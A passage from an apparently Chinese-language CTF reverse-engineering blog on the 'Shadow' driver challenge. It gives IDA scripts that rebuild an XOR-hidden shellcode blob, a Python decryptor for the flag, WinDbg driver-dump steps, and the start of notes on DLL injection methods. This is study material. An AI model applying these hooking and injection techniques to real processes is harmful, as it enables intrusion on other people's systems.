class="line">  (<span class="string">&#x27;src_&#x27;</span>,   <span class="number">0x1AD</span>, <span class="number">0x11</span>),</span><br><span class="line">  (<span class="string">&#x27;src__0&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x22</span>),</span><br><span class="line">  (<span class="string">&#x27;src__1&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x33</span>),</span><br><span class="line">  (<span class="string">&#x27;src__2&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x44</span>),</span><br><span class="line">  (<span class="string">&#x27;src__3&#x27;</span>, <span class="number">0x1AE</span>, <span class="number">0x55</span>),</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> name, size, xk in parts:</span><br><span class="line">  ea = ida_name.get_name_ea(<span class="number">0xffffffffffffffff</span>, name)</span><br><span class="line">  b = bytearray(ida_bytes.get_bytes(ea, size))</span><br><span class="line">  b.reverse()</span><br><span class="line">  <span class="keyword">for</span> i in range(len(b)):</span><br><span class="line">      b[i] ^= xk</span><br><span class="line">  blob.extend(b)</span><br><span class="line"></span><br><span class="line">with open(out_path, <span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">  f.write(blob)</span><br><span class="line"></span><br><span class="line">entry_off = <span class="number">0x775</span></span><br><span class="line">print(hex(entry_off), blob[entry_off:entry_off+<span class="number">32</span>].hex(), len(blob))</span><br></pre></td></tr></table></figure>

<p>或者直接重建在当前文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_auto</span><br><span class="line"></span><br><span class="line">PARTS = [</span><br><span class="line">  (<span class="string">&quot;src_&quot;</span>,   <span class="number">0x1AD</span>, <span class="number">0x11</span>),</span><br><span class="line">  (<span class="string">&quot;src__0&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x22</span>),</span><br><span class="line">  (<span class="string">&quot;src__1&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x33</span>),</span><br><span class="line">  (<span class="string">&quot;src__2&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x44</span>),</span><br><span class="line">  (<span class="string">&quot;src__3&quot;</span>, <span class="number">0x1AE</span>, <span class="number">0x55</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">FUNC_OFFSETS = [<span class="number">0x000</span>, <span class="number">0x055</span>, <span class="number">0x1AD</span>, <span class="number">0x225</span>, <span class="number">0x392</span>, <span class="number">0x476</span>, <span class="number">0x775</span>, <span class="number">0x862</span>]</span><br><span class="line">FUNC_NAMES = [</span><br><span class="line">  <span class="string">&quot;shc_xorshift&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_init_sbox&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_subword&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_expand_keys&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_mix_seed&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_crypt_block&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_main&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rebuild_blob</span>():</span><br><span class="line">  blob = <span class="built_in">bytearray</span>()</span><br><span class="line">  <span class="keyword">for</span> name, size, xk <span class="keyword">in</span> PARTS:</span><br><span class="line">      ea = ida_name.get_name_ea(<span class="number">0xFFFFFFFFFFFFFFFF</span>, name)</span><br><span class="line">      <span class="keyword">if</span> ea == <span class="number">0xFFFFFFFFFFFFFFFF</span>:</span><br><span class="line">          <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;missing symbol: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">      b = ida_bytes.get_bytes(ea, size)</span><br><span class="line">      <span class="keyword">if</span> b <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(b) != size:</span><br><span class="line">          <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;read fail: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">      t = <span class="built_in">bytearray</span>(b)</span><br><span class="line">      t.reverse()                 <span class="comment"># sub_140001B60</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">          t[i] ^= xk              <span class="comment"># 每段固定异或</span></span><br><span class="line">      blob.extend(t)</span><br><span class="line">  <span class="keyword">return</span> blob</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">map_blob</span>(<span class="params">blob, base=<span class="number">0x180020000</span>, seg_name=<span class="string">&quot;shc0&quot;</span></span>):</span><br><span class="line">  seg = ida_segment.getseg(base)</span><br><span class="line">  <span class="keyword">if</span> seg:</span><br><span class="line">      ida_segment.del_segm(base, ida_segment.SEGMOD_KILL)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 64-bit CODE 段</span></span><br><span class="line">  ok = idc.AddSeg(base, base + <span class="built_in">len</span>(blob), <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">      <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;AddSeg failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">  idc.set_segm_name(base, seg_name)</span><br><span class="line">  idc.set_segm_class(base, <span class="string">&quot;CODE&quot;</span>)</span><br><span class="line">  ida_bytes.patch_bytes(base, <span class="built_in">bytes</span>(blob))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(FUNC_OFFSETS) - <span class="number">1</span>):</span><br><span class="line">      s = base + FUNC_OFFSETS[i]</span><br><span class="line">      e = base + FUNC_OFFSETS[i + <span class="number">1</span>]</span><br><span class="line">      ida_funcs.del_func(s)</span><br><span class="line">      ida_bytes.del_items(s, ida_bytes.DELIT_SIMPLE, e - s)</span><br><span class="line">      idc.create_insn(s)</span><br><span class="line">      ida_funcs.add_func(s, e)</span><br><span class="line">      idc.set_name(s, FUNC_NAMES[i], idc.SN_CHECK)</span><br><span class="line"></span><br><span class="line">  ida_auto.auto_wait()</span><br><span class="line">  <span class="keyword">return</span> base + <span class="number">0x775</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  blob = rebuild_blob()</span><br><span class="line">  out_path = <span class="string">&quot;/tmp/sub_1400012C0_shellcode.bin&quot;</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      f.write(blob)</span><br><span class="line"></span><br><span class="line">  entry = map_blob(blob)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;blob_len =&quot;</span>, <span class="built_in">len</span>(blob))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;dump =&quot;</span>, out_path)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;entry =&quot;</span>, <span class="built_in">hex</span>(entry))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;entry_32 =&quot;</span>, blob[<span class="number">0x775</span>:<span class="number">0x775</span>+<span class="number">32</span>].<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>sub_1400012C0 会先重建一段代码 blob（你说的 shellcode）</p>
<ul>
<li>5 段数据拼接：长度分别 0x1AD, 0x1AD, 0x1AD, 0x1AD, 0x1AE</li>
<li>每段都先 reverse，再异或常量（对应 0x11&#x2F;0x22&#x2F;0x33&#x2F;0x44&#x2F;0x55）</li>
<li>总长度 0x862，入口偏移是 +0x775</li>
</ul>
<p>key</p>
<ul>
<li>先初始化：seed &#x3D; 0x17658990C729C992</li>
<li>循环 0x39 次：seed &#x3D; (seed * 0x10003) ^ <em>(uint64_t</em>)a3</li>
<li>这里 a3 是传入的指针，取的是 *a3 的 64 位值</li>
<li>然后把 &amp;seed 传给 blob 入口做 8 字节分组变换</li>
</ul>
<p>关键是得知道a3</p>
<p>sub_1400012C0(a1, a2, a3) 的 a3 来自被 hook 的原函数第三个参数。</p>
<p>这里被 hook 的函数是 KeDelayExecutionThread</p>
<p>所以参数映射是：</p>
<ul>
<li>a1 &#x3D; KPROCESSOR_MODE WaitMode</li>
<li>a2 &#x3D; BOOLEAN Alertable</li>
<li>a3 &#x3D; PLARGE_INTEGER Interval</li>
</ul>
<p>对 Maze.exe 的 Sleep(50)，常见对应是：</p>
<ul>
<li>*a3 &#x3D; -500000（即 -(50 * 10000)）</li>
<li>64 位补码：0xFFFFFFFFFFF85EE0</li>
</ul>
<p>密文</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260219204921174.png" alt="image-20260219204921174"></p>
<p>但是上面的那些不知道在干什么交叉引用发现实际对密文也进行了异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line">MASK64 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">CT = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;51dab85273b91700e002f4b22c5f2262330c0144bb709d928a06f92c1d8f0aa9&quot;</span></span><br><span class="line">    <span class="string">&quot;227b84307113d0f9&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">INTERVAL = -<span class="number">500000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol32</span>(<span class="params">x, r</span>):</span><br><span class="line">    r &amp;= <span class="number">31</span></span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; r) | (x &gt;&gt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror32</span>(<span class="params">x, r</span>):</span><br><span class="line">    r &amp;= <span class="number">31</span></span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; r) | (x &lt;&lt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorshift32</span>(<span class="params">x</span>):</span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    v2 = (((x &lt;&lt; <span class="number">13</span>) &amp; MASK32) ^ x)</span><br><span class="line">    v2 = ((v2 &gt;&gt; <span class="number">17</span>) ^ v2) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> (((v2 &lt;&lt; <span class="number">5</span>) &amp; MASK32) ^ v2) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_seed</span>(<span class="params">interval_signed</span>):</span><br><span class="line">    interval = interval_signed &amp; MASK64</span><br><span class="line">    v18 = <span class="number">0x17658990C729C992</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">57</span>):</span><br><span class="line">        v18 = (interval ^ ((<span class="number">65539</span> * v18) &amp; MASK64)) &amp; MASK64</span><br><span class="line">    <span class="keyword">return</span> v18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_tables</span>(<span class="params">a0, a1</span>):</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    v = ((a1 &gt;&gt; <span class="number">21</span>) | ((a1 &lt;&lt; <span class="number">11</span>) &amp; MASK32)) ^ a0 ^ <span class="number">0x1244F4C6</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        v = xorshift32(v)</span><br><span class="line">        idx = v % (j + <span class="number">1</span>)</span><br><span class="line">        p[j], p[idx] = p[idx], p[j]</span><br><span class="line">    inv = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        inv[p[k]] = k</span><br><span class="line">    <span class="keyword">return</span> p, inv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_round_keys</span>(<span class="params">a0, a1</span>):</span><br><span class="line">    v5 = (a0 ^ <span class="number">0xB7E15163</span>) &amp; MASK32</span><br><span class="line">    v4 = (a1 - <span class="number">0x61C88647</span>) &amp; MASK32</span><br><span class="line">    rk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v6 = ((((-<span class="number">0x61C88647</span> * i) &amp; MASK32) ^ <span class="number">0xB7E15163</span>) + (rol32(v4, v5 &amp; <span class="number">31</span>) ^ v5)) &amp; MASK32</span><br><span class="line">        w = (ror32((v4 + v5) &amp; MASK32, v4 &amp; <span class="number">31</span>) ^ v6) &amp; MASK32</span><br><span class="line">        rk.append(w)</span><br><span class="line">        v5 = (w ^ v4) &amp; MASK32</span><br><span class="line">        v4 = (rol32(w, v6 &amp; <span class="number">31</span>) + v6) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_block_counter</span>(<span class="params">a5, a0, a1</span>):</span><br><span class="line">    v3 = ((a1 ^ <span class="number">0xDEADBEEF</span>) + (rol32(a0, a5 &amp; <span class="number">31</span>) ^ ((<span class="number">73244475</span> * (a5 + <span class="number">1</span>)) &amp; MASK32))) &amp; MASK32</span><br><span class="line">    t = (((v3 &gt;&gt; <span class="number">16</span>) ^ v3) * <span class="number">2146121005</span>) &amp; MASK32</span><br><span class="line">    v4 = (-<span class="number">2073254261</span> * (((t &gt;&gt; <span class="number">15</span>) ^ t) &amp; MASK32)) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> ((v4 &gt;&gt; <span class="number">16</span>) ^ v4) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subword</span>(<span class="params">x, tab</span>):</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        (tab[(x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">        | (tab[(x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        | (tab[(x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        | tab[x &amp; <span class="number">0xFF</span>]</span><br><span class="line">    ) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_block</span>(<span class="params">c0, c1, a0, a1, rk, p, inv, blk_idx</span>):</span><br><span class="line">    v16 = mix_block_counter(blk_idx, a0, a1)</span><br><span class="line">    v8 = (c0 ^ ((rol32(v16, <span class="number">11</span>) + a1) &amp; MASK32)) &amp; MASK32</span><br><span class="line">    v12 = (c1 ^ v16 ^ a0) &amp; MASK32</span><br><span class="line"></span><br><span class="line">    v15 = <span class="number">0</span></span><br><span class="line">    v15_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v15 = (v15 + ((rk[i] ^ <span class="number">0xB7E15163</span>) &amp; MASK32)) &amp; MASK32</span><br><span class="line">        v15_list.append(v15)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        v15 = v15_list[i]</span><br><span class="line">        <span class="keyword">if</span> v15 &amp; <span class="number">1</span>:</span><br><span class="line">            v8, v12 = v12, v8</span><br><span class="line"></span><br><span class="line">        v10 = ror32(v8, ((rk[i] &gt;&gt; <span class="number">1</span>) + (v15 ^ v12)) &amp; <span class="number">31</span>)</span><br><span class="line">        t = rol32((v12 - (rk[i] ^ v10)) &amp; MASK32, p[v10 &amp; <span class="number">0xFF</span>] &amp; <span class="number">31</span>)</span><br><span class="line">        v12_prev = subword(t, inv)</span><br><span class="line"></span><br><span class="line">        s = (</span><br><span class="line">            (v10 ^ rol32(rk[i], t &amp; <span class="number">31</span>) ^ ((rol32(v15, <span class="number">29</span>) + t) &amp; MASK32))</span><br><span class="line">            - (rk[i] ^ v15)</span><br><span class="line">        ) &amp; MASK32</span><br><span class="line">        v8_prev = subword(s, inv)</span><br><span class="line"></span><br><span class="line">        v8, v12 = v8_prev, v12_prev</span><br><span class="line"></span><br><span class="line">    w0 = ((v16 + a0) ^ v8) &amp; MASK32</span><br><span class="line">    w1 = (rol32(v16, <span class="number">25</span>) ^ a1 ^ v12) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> w0, w1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_40</span>(<span class="params">ct40, interval_signed</span>):</span><br><span class="line">    seed = derive_seed(interval_signed)</span><br><span class="line">    a0 = seed &amp; MASK32</span><br><span class="line">    a1 = (seed &gt;&gt; <span class="number">32</span>) &amp; MASK32</span><br><span class="line">    p, inv = init_tables(a0, a1)</span><br><span class="line">    rk = expand_round_keys(a0, a1)</span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> bi <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        blk = ct40[bi * <span class="number">8</span>: bi * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">        c0 = <span class="built_in">int</span>.from_bytes(blk[<span class="number">0</span>:<span class="number">4</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        c1 = <span class="built_in">int</span>.from_bytes(blk[<span class="number">4</span>:<span class="number">8</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        w0, w1 = dec_block(c0, c1, a0, a1, rk, p, inv, bi)</span><br><span class="line">        out += w0.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        out += w1.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt = decrypt_40(CT, INTERVAL)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"><span class="built_in">print</span>(pt.rstrip(<span class="string">b&quot;\x00&quot;</span>).decode(<span class="string">&quot;ascii&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>ebbc8827-c040-4a7d-8bc7-0aeccb1ce094</p>
<h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>不太了解内核逆向</p>
<p>参考[<a target="_blank" rel="noopener" href="https://qmeimei10086.github.io/2026/02/05/VNCTF-2026-Shadow-%E9%A9%B1%E5%8A%A8dump%E4%BF%AE%E5%A4%8D+%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5+ptehook/">VNCTF 2026]Shadow-驱动dump修复+反射注入+ptehook - Qmeimei’s Blog | 探索一切，攻破一切</a></p>
<p>师傅写的很详细</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; sxe ld Shadow.sys</span><br><span class="line">kd&gt; g</span><br><span class="line">kd&gt; bp Shadow+0xC1B7</span><br><span class="line">kd&gt; g</span><br></pre></td></tr></table></figure>

<p>断再这里</p>
<blockquote>
<p><code>sxe</code> &#x3D; <strong>Set Exception (on) Event</strong></p>
<p>当某个指定的“调试事件”发生时，让调试器中断下来。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260220234731673.png" alt="image-20260220234731673"></p>
<p>这里的rcx就是载入驱动的首地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r rcx</span><br></pre></td></tr></table></figure>

<p>查看rcx寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db rcx L10</span><br><span class="line">!dh rcx # 把 rcx 当成一个 PE 映像基址，解析并显示它的 DOS 头和 NT 头</span><br></pre></td></tr></table></figure>

<p><code>d</code> &#x3D; display memory</p>
<p><code>b</code> &#x3D; byte（按字节显示）</p>
<p><code>rcx</code> &#x3D; 起始地址</p>
<p><code>L10</code> &#x3D; 显示 0x10 个字节（16字节）</p>
<p>输出有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.00 subsystem version</span><br><span class="line"> A000 size of image</span><br><span class="line">  400 size of headers</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.writemem D:\dumped.sys ffffb683ef916000 L?<span class="number">0</span>xA000</span><br></pre></td></tr></table></figure>

<p>dump出来</p>
<p>之后就是修复符号</p>
<blockquote>
<p>不错的教程：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274505-1.htm">https://bbs.kanxue.com/thread-274505-1.htm</a></p>
<p>想看原理可以看里面的文章讲的非常好</p>
<p>里面的pe_unmapper挺好用的，<a target="_blank" rel="noopener" href="https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper">https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper</a></p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pe_unmapper.exe /<span class="keyword">in</span> D:\dumped.sys <span class="number">00400000</span> /out fix.dump</span><br></pre></td></tr></table></figure>

<p>直接修复</p>
<p>修复方法2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260223222525923.png" alt="image-20260223222525923"></p>
<h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><p>之前学过但是得详细了解下，这里再补充一下</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zer0o/p/17286597.html#dll%E6%B3%A8%E5%85%A5">《逆向工程核心原理》之DLL注入 - Zer0o - 博客园</a></p>
<p><a href="https://matriy330.github.io/791560d6/">UE4逆向初探-OverWatch | Matriy’s blog</a></p>
<p>DLL注入指的是向运行中的其他进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其他进程自行调用LoadLibrary() API,加载用户指定的DLL文件。DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216130408174.png" alt="image-20260216130408174"></p>
<p>向某个进程注入DLL时主要使用以下三种方法：</p>
<ul>
<li>创建远程线程（CreateRemoteThread() API）</li>
<li>使用注册表（AppInit_DLLs值）</li>
<li>消息钩取（SetWindowsHookEx() API）</li>
</ul>
<h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h2><p>基本原理：</p>
<ol>
<li><code>OpenProcess()</code> 获取目标进程句柄</li>
<li><code>VirtualAllocEx()</code> 在目标进程中分配内存</li>
<li><code>WriteProcessMemory()</code> 写入 DLL 路径</li>
